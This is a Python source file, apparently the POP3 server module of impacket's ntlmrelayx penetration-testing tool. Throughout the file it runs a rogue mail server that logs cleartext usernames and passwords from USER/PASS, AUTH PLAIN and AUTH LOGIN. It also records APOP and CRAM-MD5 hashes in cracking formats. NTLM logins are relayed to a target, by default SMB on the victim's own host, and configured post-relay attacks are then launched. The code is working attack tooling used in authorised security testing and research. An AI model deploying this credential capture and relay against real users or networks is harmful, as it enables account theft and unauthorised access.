from threading import Thread
import socketserver

from impacket import LOG, ntlm
from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.examples.ntlmrelayx.servers.socksserver import activeConnections
from impacket.examples.utils import get_address
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.ssl import generate_self_signed_certificate, sni_callback
from OpenSSL import SSL, crypto
import socket
import re
import os
import traceback
import base64


class POP3Server(socketserver.ThreadingMixIn, socketserver.TCPServer):
    def __init__(self, server_address, RequestHandlerClass, config: NTLMRelayxConfig):
        self.config = config
        if self.config.pop3_server_cert and self.config.pop3_server_key:
            try:
                self.server_cert = crypto.load_certificate(crypto.FILETYPE_PEM, self.config.pop3_server_cert)
                self.server_key = crypto.load_privatekey(crypto.FILETYPE_PEM, self.config.pop3_server_key)
            except Exception as e:
                LOG.error(f"(POP3): Unable to load cert chain from files: {e}")
                exit(1)
        else:
            LOG.warning("(POP3) Generating self-signed certificate")
            server_cert, server_key = generate_self_signed_certificate()
            self.server_cert = crypto.load_certificate(crypto.FILETYPE_PEM, server_cert)
            self.server_key = crypto.load_privatekey(crypto.FILETYPE_PEM, server_key)

        self.daemon_threads = True
        self.address_family, self.server_address = get_address(server_address[0], server_address[1], self.config.ipv6)
        socketserver.TCPServer.allow_reuse_address = True
        socketserver.TCPServer.__init__(self, server_address, RequestHandlerClass)

class POP3Handler(socketserver.BaseRequestHandler):
    def __init__(self,request: socket.socket, client_address, server):
        self.server = server
        self.challengeMessage = None
        self.client = None
        self.machineAccount = None
        self.machineHashes = None
        self.domainIp = None
        self.authUser = None
        self.tls_enabled = False
        
        if self.server.config.target is None:
            # Reflection mode, defaults to SMB at the target, for now
            self.server.config.target = TargetsProcessor(singleTarget='SMB://%s:445/' % client_address[0])
        self.target = self.server.config.target.getTarget()
        if self.target is None:
            LOG.info("(POP3): Received connection from %s, but there are no more targets left!" % client_address[0])
            return

        LOG.info("(POP3): Received connection from %s, attacking target %s://%s" % (client_address[0] ,self.target.scheme, self.target.netloc))
        super().__init__(request, client_address, server)
    
    def upgrade_to_tls(self):
        ''' Upgrading connection to TOS using certificate '''
        try:
            # Create SSL context
            context = SSL.Context(SSL.SSLv23_METHOD)
            context.set_options(SSL.OP_NO_SSLv2 | SSL.OP_NO_SSLv3)
            context.use_certificate(self.server.server_cert)
            context.use_privatekey(self.server.server_key)
            context.sni_callback = sni_callback
            connection = SSL.Connection(context, self.request)
            connection.set_accept_state()
            connection.do_handshake()
            self.tls_enabled = True
            
            # Wrap socket
            self.request = connection

            LOG.info(f"(POP3): Successfully upgraded to TLS from {self.client_address[0]}")
            return True
        except Exception as e:
            LOG.error(f"(POP3): TLS upgrade failed: {e}")
            return False
    
    def generate_challenge(self):
        """Generate challenge for APOP and CRAM-MD5"""
        import time
        import random
        timestamp = int(time.time())
        random_data = random.randint(1000, 9999)
        # APOP format: <process-id.clock@hostname>
        self.challenge = "<%d.%d@%s>" % (random_data, timestamp, "IMPACKETMACHINE")
        return self.challenge

    def send_packet(self, packet):
        """Send a packet to client"""
        self.request.send(packet.encode('latin-1'))
    
    def send_ok(self, message=""):
        """Send +OK response"""
        if message:
            response = "+OK %s\r\n" % message
        else:
            response = "+OK\r\n"
        self.request.send(response.encode('latin-1'))
    
    def send_err(self, message=""):
        """Send -ERR response"""
        if message:
            response = "-ERR %s\r\n" % message
        else:
            response = "-ERR\r\n"
        self.request.send(response.encode('latin-1'))
    
    def send_continue(self, data=""):
        """Send continuation (+) response for multi-line auth"""
        if data:
            response = "+ %s\r\n" % data
        else:
            response = "+\r\n"
        self.request.send(response.encode('latin-1'))
    
    def handle_apop(self, data):
        """Handle APOP authentication (MD5 challenge-response)"""
        # APOP username digest
        # digest is MD5(challenge + password)
        try:
            parts = data.strip().split(b' ', 2)
            if len(parts) < 3:
                return False
            
            username = parts[1].decode('latin-1')
            digest = parts[2].decode('latin-1').lower()
            
            # Format for hashcat/john: username:$apop$challenge$digest
            hash_string = "%s:$apop$%s$%s" % (username, self.challenge, digest)

            LOG.info(f"(POP3) Captured AUTH APOP authentication from {self.client_address[0]}. User: {username}, hash: {hash_string}")            
            return True
        except Exception as e:
            LOG.error(f"(POP3) Error parsing APOP: {e}")
            return False
    
    def handle_auth_plain(self, data):
        """Handle AUTH PLAIN (base64 encoded username/password)"""
        try:
            # AUTH PLAIN can be sent as:
            # AUTH PLAIN <base64>
            # or
            # AUTH PLAIN
            # <base64>
            
            if len(data.strip().split(b' ')) > 2:
                # Inline format
                auth_data = data.strip().split(b' ', 2)[2]
            else:
                # Need to read next line
                self.send_continue()
                auth_data = self.request.recv(1024).strip()
            
            # Decode base64
            decoded = base64.b64decode(auth_data)
            # Format: [authzid]\x00username\x00password
            parts = decoded.split(b'\x00')
            
            if len(parts) >= 3:
                username = parts[1].decode('latin-1', errors='ignore')
                password = parts[2].decode('latin-1', errors='ignore')
            elif len(parts) == 2:
                username = parts[0].decode('latin-1', errors='ignore')
                password = parts[1].decode('latin-1', errors='ignore')
            else:
                return False
            
            LOG.info(f"(POP3) Captured AUTL PLAIN authentication from {self.client_address[0]}. {username} : {password}")
            return True
        except Exception as e:
            LOG.error(f"(POP3) Error when parsing AUTH PLAIN: {e}")
            return False
    
    def handle_auth_login(self, data):
        """Handle AUTH LOGIN (two-stage base64 authentication)"""
        try:
            # AUTH LOGIN is two-stage:
            # Client: AUTH LOGIN
            # Server: + VXNlcm5hbWU6  (base64 "Username:")
            # Client: <base64 username>
            # Server: + UGFzc3dvcmQ6  (base64 "Password:")
            # Client: <base64 password>
            
            # Send "Username:" prompt
            self.send_continue(base64.b64encode(b"Username:").decode('latin-1'))
            username_b64 = self.request.recv(1024).strip()
            
            if not username_b64:
                return False
            
            username = base64.b64decode(username_b64).decode('latin-1', errors='ignore')
            
            # Send "Password:" prompt
            self.send_continue(base64.b64encode(b"Password:").decode('latin-1'))
            password_b64 = self.request.recv(1024).strip()
            
            if not password_b64:
                return False
            
            password = base64.b64decode(password_b64).decode('latin-1', errors='ignore')

            LOG.info(f"(POP3) Captured AUTH LOGIN authentication from {self.client_address[0]}. {username} : {password}")
            return True
        except Exception as e:
            LOG.error(f"(POP3) Error when parsing AUTH LOGIN authentication: {e}")
            return False
    
    def handle_auth_cram_md5(self, data):
        """Handle AUTH CRAM-MD5 (challenge-response)"""
        try:
            # Generate challenge
            import time
            challenge = self.generate_challenge()
            challenge_b64 = base64.b64encode(challenge.encode('latin-1')).decode('latin-1')
            
            # Send challenge
            self.send_continue(challenge_b64)
            
            # Receive response
            response_b64 = self.request.recv(1024).strip()
            if not response_b64:
                return False
            
            response = base64.b64decode(response_b64).decode('latin-1', errors='ignore')
            # Response format: username<space>digest
            parts = response.split(' ', 1)
            
            if len(parts) < 2:
                return False
            
            username = parts[0]
            digest = parts[1].lower()
            
            # Format for hashcat: $cram_md5$challenge$digest$username
            hash_string = "%s:$cram_md5$%s$%s" % (username, challenge, digest)

            LOG.info(f"(POP3) Captured AUTH CRAM-MD5 authentication from {self.client_address[0]}. {username} : {hash_string}")
            return True
        except Exception as e:
            LOG.error(f"(POP3) Error parsing CRAM-MD5: {e}")
            return False
    
    def handle_auth_ntlm(self, data):
        ''' Handle AUTHENTICATE NTLM command '''
        try:
            response = "+\r\n"
            self.request.send(response.encode('latin-1'))
            type1_data = self.request.recv(2048)
            if not type1_data:
                return False
            negotiate_msg = base64.b64decode(type1_data.decode('latin-1', errors="ignore").strip())
            # Verify NTLMSSP signature
            if negotiate_msg[0:8] != b'NTLMSSP\x00':
                return False
            
            # Relay to gain challenge
            challenge = self.do_ntlm_negotiate(negotiate_msg)
            if challenge is None:
                LOG.error(f"(POP3) Error when relay NTLM Type 2 message to client ")
                return False
            
            response = "+ %s\r\n" % base64.b64encode(challenge.getData()).decode('latin-1')
            self.request.send(response.encode('latin-1'))

            authenticate_message = self.request.recv(4096)
            if not authenticate_message:
                return False

            auth_decoded = authenticate_message.decode('latin-1', errors='ignore').strip()
        
            if auth_decoded == '*' or auth_decoded == '':
                LOG.error(f'(POP3) Client cancelled NTLM authentication')
                self.send_err("AUTHENTICATE cancelled")
                return False
            
            if not all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\r\n' for c in auth_decoded):
                self.send_err("AUTHENTICATE failed")
                return False
            
            try:
                auth_data = base64.b64decode(auth_decoded)
            except Exception as e:
                self.send_err("AUTHENTICATE failed")
                return False
            
            authenticateMessage = self.do_ntlm_auth(auth_data)
            if authenticateMessage is None:
                # Authentication failed
                self.send_err("AUTHENTICATE failed") # Fix here!
                LOG.error(f"(POP3) Authenticating against {self.target.scheme}://{self.target.netloc} FAILED")
                return False
            # relay worked, do whatever we want
            self.send_err("AUTHENTICATE Relayed by Impacket")
            self.client.setClientId()
            if authenticateMessage['flags'] & ntlm.NTLMSSP_NEGOTIATE_UNICODE:
                LOG.info("(POP3): Authenticating connection from %s/%s@%s against %s://%s SUCCEED [%s]" % (
                    authenticateMessage['domain_name'].decode('utf-16le'), authenticateMessage['user_name'].decode('utf-16le'),
                    self.client_address[0], self.target.scheme, self.target.netloc, self.client.client_id))
            else:
                LOG.info("(POP3): Authenticating connection from %s/%s@%s against %s://%s SUCCEED [%s]" % (
                    authenticateMessage['domain_name'].decode('ascii'), authenticateMessage['user_name'].decode('ascii'),
                    self.client_address[0], self.target.scheme, self.target.netloc, self.client.client_id))
            
            ntlm_hash_data = outputToJohnFormat(self.challengeMessage['challenge'], authenticateMessage['user_name'], authenticateMessage['domain_name'],
                                                authenticateMessage['lanman'], authenticateMessage['ntlm'])
            self.client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

            if self.server.config.dumpHashes is True:
                LOG.info("(POP3): %s" % ntlm_hash_data['hash_string'])

            if self.server.config.outputFile is not None:
                writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                        self.server.config.outputFile)

            self.server.config.target.registerTarget(self.target, True, self.authUser)

            self.do_attack()
            return True
        except Exception as e:
            LOG.error(f"(POP3) Error when handle NTLM Auth: {e}")
            traceback.print_exc()
            return False
    
    def do_ntlm_negotiate(self, token: bytes) -> bytes | None:
        self.client = self.server.config.protocolClients[self.target.scheme.upper()](self.server.config, self.target)
        # If connection failed -> return False
        if not self.client.initConnection():
            return None
        self.challengeMessage = self.client.sendNegotiate(token)
        if self.server.config.remove_target:
            av_pairs = ntlm.AV_PAIRS(self.challengeMessage['TargetInfoFields'])
            del av_pairs[ntlm.NTLMSSP_AV_HOSTNAME]
            self.challengeMessage['TargetInfoFields'] = av_pairs.getData()
            self.challengeMessage['TargetInfoFields_len'] = len(av_pairs.getData())
            self.challengeMessage['TargetInfoFields_max_len'] = len(av_pairs.getData())
        
        if self.challengeMessage is False:
            return None
        return self.challengeMessage
    
    def do_ntlm_auth(self, token: bytes) -> bytes | None:
        self.authenticateMessage = ntlm.NTLMAuthChallengeResponse()
        self.authenticateMessage.fromString(token)
        self.authUser = self.authenticateMessage.getUserString()
        if self.authenticateMessage['user_name'] != '' or self.target.hostname == '127.0.0.1':
            clientResponse, errorCode = self.client.sendAuth(token)
        else:
            # Anonymous login send STATUS_ACCESS_DENIED so we force the client to send his credentials, except when coming from localhost
            errorCode = STATUS_ACCESS_DENIED
        if errorCode == STATUS_SUCCESS:
            return self.authenticateMessage
        return None
    
    def do_attack(self):
        # Check if SOCKS is enabled and if we support the target scheme
        if self.server.config.runSocks and self.target.scheme.upper() in self.server.config.socksServer.supportedSchemes:
            # Pass all the data to the socksplugins proxy
            activeConnections.put((self.target.hostname, self.client.targetPort, self.target.scheme.upper(),
                                    self.authUser, self.client, self.client.sessionData))
            return

        # If SOCKS is not enabled, or not supported for this scheme, fall back to "classic" attacks
        if self.target.scheme.upper() in self.server.config.attacks:
            # We have an attack.. go for it
            clientThread = self.server.config.attacks[self.target.scheme.upper()](self.server.config, self.client.session,
                                                                            self.authUser, self.target, self.client)
            clientThread.start()
        else:
            LOG.error('(POP3): No attack configured for %s' % self.target.scheme.upper())

    def SendPacketAndRead(self):
        self.request.send(f"+OK\r\n".encode('latin-1'))
        return self.request.recv(2048)
    
    def handle(self):
        try:
            # Generate challenge for APOP
            challenge = self.generate_challenge()
            
            # Send banner with challenge for APOP support
            banner = "+OK POP3 Impacket server ready %s\r\n" % challenge
            self.request.send(banner.encode('latin-1'))

            while True:
                # Read first command
                data = self.request.recv(1024)
                print("Command is:", data)
                
                # Handle CAPA (capability) command
                if data[0:4].upper() == b'CAPA':
                    # Advertise supported auth methods
                    capabilities = [
                        "+OK Capability list follows",
                        "USER", "STLS",
                        "SASL PLAIN LOGIN CRAM-MD5 NTLM",
                        "IMPLEMENTATION IMPACKET POP3",
                        "."
                    ]
                    self.request.send("\r\n".join(capabilities).encode('latin-1') + b"\r\n")
                    data = self.request.recv(1024)
                
                # Handle STARTTLS command
                if data[0:4].upper() == b'STLS':
                    self.request.send("+OK Begin TLS negotiation\r\n".encode('latin-1'))
                    if not self.upgrade_to_tls():
                        # TLS upgrade failed, closed connection
                        return
                
                # Handle AUTH command
                if data[0:4].upper() == b'AUTH':
                    mechanism = data[5:].strip().upper()
                    
                    if mechanism == b'PLAIN':
                        self.handle_auth_plain(data)
                        self.send_err("Authentication captured by Impacket")
                        return
                    
                    elif mechanism == b'LOGIN':
                        self.handle_auth_login(data)
                        self.send_err("Authentication captured by Impacket")
                        return
                    
                    elif mechanism == b'CRAM-MD5' or mechanism.startswith(b'CRAM'):
                        self.handle_auth_cram_md5(data)
                        self.send_err("Authentication captured by Impacket")
                        return
                    
                    elif mechanism == b'NTLM':
                        if self.handle_auth_ntlm(data):
                            self.send_err("Authentication successfully relayed by Impacket")
                        else:
                            self.send_err("Authentication failed")
                        return
                    
                    elif not mechanism:
                        # AUTH without mechanism - list supported
                        auth_list = "+OK Supported mechanisms:\r\nPLAIN\r\nLOGIN\r\nCRAM-MD5\r\nNTLM\r\n.\r\n"
                        self.request.send(auth_list.encode('latin-1'))
                        data = self.request.recv(1024)
                    else:
                        self.send_err("Unsupported authentication method")
                        return
                
                # Handle APOP command
                if data[0:4].upper() == b'APOP':
                    if self.handle_apop(data):
                        self.send_err("Authentication captured by Impacket")
                    else:
                        self.send_err("Authentication failed")
                    return
                
                # Handle traditional USER/PASS
                if data[0:4].upper() == b'USER':
                    User = data[5:].strip(b"\r\n").decode("latin-1", errors='ignore')
                    self.send_ok("Password required")
                    data = self.request.recv(1024)
                    
                    if data[0:4].upper() == b'PASS':
                        Pass = data[5:].strip(b"\r\n").decode("latin-1", errors='ignore')

                        LOG.info(f"(POP3) Captured USER authentication from {self.client_address[0]}. {User} : {Pass}")                    
                        self.send_err("Authentication captured by Impacket")
                        return
                
                self.send_err("Unknown command")
        except Exception as e:
            LOG.error(f"Error when handle command: {e}")

class POP3RelayServer(Thread):
    
    def __init__(self, config):
        Thread.__init__(self)
        self.daemon = True
        self.config = config
        self.server = None

    def run(self):

        if self.config.listeningPort:
            pop3port = self.config.listeningPort
        else:
            pop3port = 110
            
        LOG.info("Setting up POP3 Server on port " + str(pop3port))            

        # changed to read from the interfaceIP set in the configuration
        self.server = POP3Server((self.config.interfaceIp, pop3port), POP3Handler, self.config)

        try:
             self.server.serve_forever()
        except KeyboardInterrupt:
             pass
        LOG.info('Shutting down POP3 Server')
        self.server.server_close()